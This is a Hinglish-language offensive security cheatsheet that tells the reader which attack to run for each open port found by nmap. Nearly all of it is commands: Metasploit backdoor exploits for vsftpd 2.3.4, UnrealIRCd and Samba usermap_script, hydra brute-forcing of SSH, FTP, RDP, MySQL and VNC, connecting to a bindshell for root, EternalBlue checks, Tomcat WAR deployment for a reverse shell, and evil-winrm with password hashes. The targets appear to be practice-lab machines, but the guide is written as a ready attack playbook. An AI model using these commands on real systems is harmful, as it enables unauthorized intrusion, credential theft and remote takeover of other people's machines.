# PORT NUMBER DEKHA — NEXT KYA KARO? Complete Attack Guide

---

## Ye Kya Hai?
Nmap scan kiya, ports open dikhe — ab kya? Har port pe ek service chalti hai, aur har
service ke specific attacks hote hain. Ye cheatsheet tujhe batayegi — port number dekha,
next kya command run karo, kaunsa attack try karo.

**Remember:** Port = Door, Service = Jo door ke peeche baitha hai, Version = Uski exact identity

---

## FIRST 3 COMMANDS ON ANY TARGET — Hamesha Ye Pehle Karo

```bash
# 1. Full Port Scan with Version Detection
nmap -sV -sC -p- -T4 <TARGET_IP>
# Ye SABSE important command hai — saare ports, versions, default scripts

# 2. Vulnerability Scan
nmap --script vuln <TARGET_IP>
# Known vulnerabilities check karega (EternalBlue, Heartbleed, etc.)

# 3. Known Exploits Search
searchsploit <SERVICE_NAME> <VERSION>
# Example: searchsploit vsftpd 2.3.4
# Example: searchsploit apache 2.2.8
# Exploit-DB se matching exploits dikhayega
```

**Output mein SABSE important cheez: SERVICE VERSION**
Sirf "ftp" nahi, "vsftpd 2.3.4" — version se exploit milta hai!

---

## COMPREHENSIVE PORT → SERVICE → ACTION TABLE

### Port 21 — FTP (File Transfer Protocol)
```bash
# Anonymous login check:
nmap --script ftp-anon -p 21 <IP>
ftp <IP>                            # Username: anonymous, Password: (blank ya email)

# vsftpd 2.3.4 BACKDOOR (instant shell!):
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <IP>
run

# Brute force:
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP>

# Files download:
ftp <IP> → ls → get filename
```
**Kya dekh:** Anonymous login allowed? vsftpd 2.3.4 version? Sensitive files (config, passwords)?

### Port 22 — SSH (Secure Shell)
```bash
# Brute force:
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4

# Known username + key reuse:
ssh user@<IP>
ssh -i id_rsa user@<IP>            # Private key milne pe
chmod 600 id_rsa                    # Key permissions fix karo pehle

# Banner grab:
nc -nv <IP> 22
```
**Kya dekh:** Default creds (root:root, admin:admin)? SSH key kahi mili? (.ssh/id_rsa)

### Port 23 — Telnet
```bash
telnet <IP>
# Default creds: admin/admin, root/root, cisco/cisco
```
**Kya dekh:** Unencrypted — passwords cleartext mein jaate hain

### Port 25 — SMTP (Email)
```bash
# User enumeration:
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <IP>

# Nmap scripts:
nmap --script smtp-enum-users -p 25 <IP>

# Manual:
nc -nv <IP> 25
VRFY admin
VRFY root
```
**Kya dekh:** Valid usernames jo brute force mein use ho

### Port 53 — DNS
```bash
# Zone transfer (GOLD MINE — saare records mil jaate hain):
dig axfr @<IP> <DOMAIN>
# Example: dig axfr @10.10.10.5 megacorp.local

# Reverse lookup:
dig -x <IP> @<IP>

# Nmap:
nmap --script dns-zone-transfer -p 53 <IP>
```
**Kya dekh:** Zone transfer se internal hostnames, IPs, subdomains milte hain

### Port 80 / 443 / 8080 / 8443 — HTTP/HTTPS (Web)
```bash
# Directory bruteforce:
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Vulnerability scan:
nikto -h http://<IP>

# Technology detect:
whatweb http://<IP>

# Manual:
# Browse karo, source code dekho, /robots.txt, login pages
```
**Kya dekh:** CMS (WordPress/Joomla)? Login page? File upload? SQLi parameters?
Detailed attack → Cheatsheet #31 (Web to Shell)

### Port 88 — Kerberos
```bash
# AD environment confirm! Ye Domain Controller hai
kerbrute userenum -d domain.local --dc <IP> usernames.txt
```
**Kya dekh:** AD attack chain start karo → Cheatsheet #32

### Port 110 / 143 — POP3 / IMAP (Email)
```bash
# POP3:
nc -nv <IP> 110
USER admin
PASS password

# IMAP:
nc -nv <IP> 143
```
**Kya dekh:** Email credentials brute force, emails mein sensitive info

### Port 111 — RPC / NFS Related
```bash
rpcinfo -p <IP>                     # Available RPC services
showmount -e <IP>                   # NFS shares list
```

### Port 135 / 139 — MSRPC / NetBIOS
```bash
rpcclient -U "" -N <IP>
rpcclient $> enumdomusers
rpcclient $> enumdomgroups

nbtscan <IP>
enum4linux -a <IP>
```
**Kya dekh:** Null session se user enumeration possible?

### Port 161 — SNMP (UDP)
```bash
# Community string "public" se info dump:
snmpwalk -v2c -c public <IP>
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2    # Running processes
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25      # Windows users

# Brute force community strings:
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>
```
**Note:** SNMP UDP pe hai — nmap mein `-sU` flag chahiye: `nmap -sU -p 161 <IP>`

### Port 389 / 636 — LDAP
```bash
ldapsearch -x -H ldap://<IP> -s base namingContexts
ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName
nmap --script ldap-search -p 389 <IP>
```
**Kya dekh:** AD hai, domain enumeration karo

### Port 445 — SMB
```bash
# Enumeration:
enum4linux -a <IP>
smbclient -L //<IP> -N              # Share list (no password)
smbmap -H <IP>                      # Share permissions

# Connect to share:
smbclient //<IP>/share_name -N

# EternalBlue check (Windows 7/2008):
nmap --script smb-vuln-ms17-010 -p 445 <IP>

# Samba usermap_script (Linux):
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS <IP>
run
```
**Kya dekh:** Shares mein sensitive files? EternalBlue vulnerable? → Cheatsheet #30

### Port 1433 — MSSQL
```bash
impacket-mssqlclient sa:password@<IP>
# Ya:
impacket-mssqlclient sa@<IP> -windows-auth

# Nmap:
nmap --script ms-sql-info,ms-sql-config -p 1433 <IP>
```
**Kya dekh:** Default sa account, empty password, xp_cmdshell for RCE

### Port 1524 — Bindshell (INSTANT WIN!)
```bash
nc <IP> 1524
whoami
# Root shell seedha milta hai — koi exploit ki zaroorat nahi!
```

### Port 2049 — NFS
```bash
showmount -e <IP>                   # Available shares
mount -t nfs <IP>:/share /mnt/nfs   # Mount karo
ls -la /mnt/nfs                     # Contents dekho
```
**Kya dekh:** no_root_squash → privesc possible! → Cheatsheet #36

### Port 3306 — MySQL
```bash
mysql -h <IP> -u root               # Empty password try
mysql -h <IP> -u root -p            # Password prompt

# Brute force:
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<IP>
```
**Kya dekh:** root empty password? Database mein creds?

### Port 3389 — RDP (Remote Desktop)
```bash
# Brute force:
hydra -l administrator -P /usr/share/wordlists/rockyou.txt <IP> rdp -t 4

# Connect:
xfreerdp /v:<IP> /u:admin /p:password
rdesktop <IP> -u admin -p password
```

### Port 5432 — PostgreSQL
```bash
psql -h <IP> -U postgres            # Default user
# Default password try: postgres, empty

# Brute force:
hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://<IP>
```

### Port 5900 — VNC
```bash
# Brute force:
hydra -P /usr/share/wordlists/rockyou.txt <IP> vnc

# No auth? Direct connect:
vncviewer <IP>
```

### Port 5985 / 5986 — WinRM
```bash
evil-winrm -i <IP> -u user -p password
evil-winrm -i <IP> -u user -H NTLM_HASH
```
**Kya dekh:** Valid creds chahiye — AS-REP/Kerberoast se milte hain

### Port 6667 — IRC (UnrealIRCd)
```bash
# UnrealIRCd 3.2.8.1 BACKDOOR (instant shell!):
msfconsole -q
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS <IP>
run
```

### Port 8180 — Apache Tomcat
```bash
# Default creds: tomcat/tomcat, admin/admin, tomcat/s3cret
# Manager page: http://<IP>:8180/manager/html
# WAR file deploy → reverse shell
```

### Port 27017 — MongoDB
```bash
mongo <IP>                          # No auth?
show dbs
use admin
db.getUsers()
```

---

## INSTANT WINS — Pehle Ye Check Karo (Time Bachega)

```
Port 1524 open  --> nc <IP> 1524              --> INSTANT ROOT SHELL
vsftpd 2.3.4   --> Metasploit backdoor        --> INSTANT SHELL
UnrealIRCd      --> Metasploit backdoor        --> INSTANT SHELL
445 + Win7/2008 --> MS17-010 EternalBlue       --> SYSTEM SHELL
Port 5900 no auth --> vncviewer <IP>           --> DESKTOP ACCESS
MySQL root empty  --> mysql -h <IP> -u root    --> DB ACCESS
Tomcat default   --> manager/html              --> WAR DEPLOY → SHELL
```

---

## Common Mistakes (Mat Karna Ye)

1. **Sirf top 1000 ports scan karna** — `-p-` use karo, high ports miss ho jaate hain
2. **UDP ports skip karna** — SNMP (161), DNS (53) UDP pe hain: `nmap -sU`
3. **Version note nahi karna** — vsftpd 2.3.4 vs 3.0.3 — ek mein backdoor hai, doosre mein nahi
4. **Anonymous FTP try nahi karna** — Bahut baar allowed hota hai
5. **searchsploit nahi chalana** — Har service+version ke liye check karo
6. **Enum4linux skip karna jab 445 open ho** — Bahut info milti hai free mein
7. **Instant wins miss karna** — Port 1524 open ho aur tu gobuster chala raha — time waste!

---

## Quick Decision Tree

```
nmap -sV -sC -p- -T4 <IP>
  |
  +-- Port 1524? --> nc <IP> 1524 --> DONE!
  +-- Port 21 + vsftpd 2.3.4? --> Metasploit backdoor
  +-- Port 6667 + UnrealIRCd? --> Metasploit backdoor
  +-- Port 445 + Windows? --> MS17-010 check
  +-- Port 445 + Linux? --> Samba version → usermap_script?
  |
  +-- Port 80/443? --> gobuster + nikto + manual → Web attacks (#31)
  +-- Port 88/389? --> AD environment → Kerberos attacks (#32)
  +-- Port 22? --> hydra brute / key reuse
  +-- Port 21? --> anonymous login / hydra
  +-- Port 3389? --> RDP brute force
  +-- Port 3306? --> MySQL root empty password
  +-- Port 5985? --> evil-winrm (creds chahiye)
  |
  +-- Har service ke liye:
        searchsploit <service> <version> --> known exploits
```
